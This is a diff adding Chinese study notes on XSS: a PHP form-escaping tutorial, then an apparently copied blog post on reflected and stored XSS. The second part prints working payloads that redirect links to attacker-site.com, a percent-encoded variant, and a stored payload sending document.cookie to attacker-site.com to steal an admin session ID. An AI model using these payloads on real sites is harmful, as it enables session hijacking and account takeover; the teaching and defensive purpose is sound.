@@ -1,0 +1,235 @@
+
+
+//===== 什么是XSS攻击与防范
+		自我理解,XSS就是利用表单等提交功能的漏洞注入代码来实现非法操作!
+
+		关于 PHP 表单安全性的重要提示
+
+		$_SERVER["PHP_SELF"] 变量能够被黑客利用！
+
+		如果您的页面使用了 PHP_SELF，用户能够输入下划线然后执行跨站点脚本（XSS）。
+
+		提示：跨站点脚本（Cross-site scripting，XSS）是一种计算机安全漏洞类型，常见于 Web 应用程序。XSS 能够使攻击者向其他用户浏览的网页中输入客户端脚本。
+
+		假设我们的一张名为 "test_form.php" 的页面中有如下表单：
+
+		<form method="post" action="<?php echo $_SERVER["PHP_SELF"];?>">
+
+		现在，如果用户进入的是地址栏中正常的 URL："http://www.example.com/test_form.php"，上面的代码会转换为：
+
+		<form method="post" action="test_form.php">
+
+		到目前，一切正常。
+
+		不过，如果用户在地址栏中键入了如下 URL：
+
+		http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E
+
+		在这种情况下，上面的代码会转换为：
+
+		<form method="post" action="test_form.php"/><script>alert('hacked')</script>
+
+		这段代码加入了一段脚本和一个提示命令。并且当此页面加载后，就会执行 JavaScript 代码（用户会看到一个提示框）。这仅仅是一个关于 PHP_SELF 变量如何被利用的简单无害案例。
+
+		您应该意识到 <script> 标签内能够添加任何 JavaScript 代码！黑客能够把用户重定向到另一台服务器上的某个文件，该文件中的恶意代码能够更改全局变量或将表单提交到其他地址以保存用户数据，等等。
+		如果避免 $_SERVER["PHP_SELF"] 被利用？
+
+		通过使用 htmlspecialchars() 函数能够避免 $_SERVER["PHP_SELF"] 被利用。
+
+		表单代码是这样的：
+
+		<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
+
+		htmlspecialchars() 函数把特殊字符转换为 HTML 实体。现在，如果用户试图利用 PHP_SELF 变量，会导致如下输出：
+
+		<form method="post" action="test_form.php/"><script>alert('hacked')</script>">
+
+		无法利用，没有危害！
+		通过 PHP 验证表单数据
+
+		我们要做的第一件事是通过 PHP 的 htmlspecialchars() 函数传递所有变量。
+
+		在我们使用 htmlspecialchars() 函数后，如果用户试图在文本字段中提交以下内容：
+
+		<script>location.href('http://www.hacked.com')</script>
+
+		- 代码不会执行，因为会被保存为转义代码，就像这样：
+
+		&lt;script&gt;location.href('http://www.hacked.com')&lt;/script&gt;
+
+		现在这条代码显示在页面上或 e-mail 中是安全的。
+
+		在用户提交该表单时，我们还要做两件事：
+
+			（通过 PHP trim() 函数）去除用户输入数据中不必要的字符（多余的空格、制表符、换行）
+			（通过 PHP stripslashes() 函数）删除用户输入数据中的反斜杠（\）
+
+		接下来我们创建一个检查函数（相比一遍遍地写代码，这样效率更好）。
+
+		我们把函数命名为 test_input()。
+
+		现在，我们能够通过 test_input() 函数检查每个 $_POST 变量，脚本是这样的：
+		实例
+
+		<?php
+		// 定义变量并设置为空值
+		$name = $email = $gender = $comment = $website = "";
+
+		if ($_SERVER["REQUEST_METHOD"] == "POST") {
+		  $name = test_input($_POST["name"]);
+		  $email = test_input($_POST["email"]);
+		  $website = test_input($_POST["website"]);
+		  $comment = test_input($_POST["comment"]);
+		  $gender = test_input($_POST["gender"]);
+		}
+
+		function test_input($data) {
+		  $data = trim($data);
+		  $data = stripslashes($data);
+		  $data = htmlspecialchars($data);
+		  return $data;
+		}
+		?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+xss攻击入门
+2013-04-06 14:28 by bangerlee, 53833 阅读, 12 评论, 收藏, 编辑
+
+xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。
+
+xss攻击可以分成两种类型：
+
+    非持久型攻击
+    持久型攻击
+
+下面我们通过具体例子，了解两种类型xss攻击。
+
+ 
+
+1.非持久型xss攻击
+
+顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。
+
+假设有以下index.php页面：
+
+<?php
+$name = $_GET['name'];
+echo "Welcome $name<br>";
+echo "<a href="http://www.cnblogs.com/bangerlee/">Click to Download</a>";
+?>
+
+该页面显示两行信息：
+
+    从URI获取 'name' 参数，并在页面显示
+    显示跳转到一条URL的链接
+
+这时，当攻击者给出以下URL链接：
+
+index.php?name=guest<script>alert('attacked')</script>
+
+当用户点击该链接时，将产生以下html代码，带'attacked'的告警提示框弹出：
+
+Welcome guest
+<script>alert('attacked')</script>
+<br>
+<a href='http://www.cnblogs.com/bangerlee/'>Click to Download</a>
+
+ 
+
+除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的：
+复制代码
+
+index.php?name=
+<script>
+window.onload = function() {
+var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";}
+</script>
+
+复制代码
+
+当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下：
+复制代码
+
+Welcome 
+<script>
+window.onload = function() {
+var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";}
+</script>
+<br>
+<a href='http://www.cnblogs.com/bangerlee/'>Click to Download</a>
+
+复制代码
+
+用户再点击 "Click to Download" 时，将跳转至攻击者提供的链接。
+
+ 
+
+对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码，以下URL同样用于实现链接地址变更：
+
+index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e
+
+ 
+
+2.持久型xss攻击
+
+持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。
+
+ 
+
+session背景知识
+
+我们知道HTTP是一个无状态维持的协议，所有请求/应答都是独立的，其间不保存状态信息。但有些场景下我们需要维护状态信息，例如用户登录完web应用后，再一定时间内，用户再进行登录，应不需要再输入用户名/密码进行鉴权。
+
+这时我们用cookie和session解决状态维护问题，当用户首次登入时，服务器为该用户创建一个 session ID，同时向游览器传送一个 cookie，cookie保存会话连接中用到的数据，session ID作为会话标识，游览器后续的请求均基于该session ID。
+
+ 
+
+攻击者可以提供一个攻击链接，当用户点击该链接时，向攻击者自己的服务器发送一条保存有用户session ID的信息，这样就可以窃取到用户的session ID，得到用户的执行权限。
+
+ 
+
+现有以下login.php，其根据 user_name 在数据中查找相应的 pass_word，然后将用户提供的 password 与查数据库所得的 pass_word 进行比较，如果验证成功则创建对应于 user_name 的 session。
+View Code
+
+ 
+
+另有以下home.php，其根据登入的用户是 admin 还是其他用户，显示不同内容，对于admin，其列出所有用户，对于其他用户，提供包含输入框的form，可在数据库中插入新的用户名信息。
+View Code
+
+ 
+
+注意以上场景中，对 admin 和其他用户进行了不同的权限设置，admin可以看到所有用户列表，下面我们来看如何获取 admin 的session ID，从而使得其他用户也能获得 admin 的权限。
+
+ 
+
+首先，攻击者以一个普通用户登录进来，然后在输入框中提交以下数据：
+
+<a href=# onclick=\"document.location=\'http://attacker-site.com/xss.php?c=\'+escape\(document.cookie\)\;\">bangerlee</a>
+
+ 
+
+攻击者提交了条带<a>标签的数据，该条数据将保存在数据库中，而当 admin 用户登入时，包含 "bangerlee" 的用户列表将显示，如果 admin 用户点击 "bangerlee" 时，在 "attacker-site.com" 所在的服务器上，攻击者就可以窃取到 admin 的session-id：
+
+xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3
+
+有了该session-id，攻击者在会话有效期内即可获得 admin 用户的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。
+
+ 
+
+当然，不是只有持久型xss攻击才能窃取session ID、用户的cookie信息，用非持久型xss也可以，只要引导用户点击某链接，将 document.cookie 信息传到指定服务器即可，以上仅作为说明持久型xss攻击的举例。
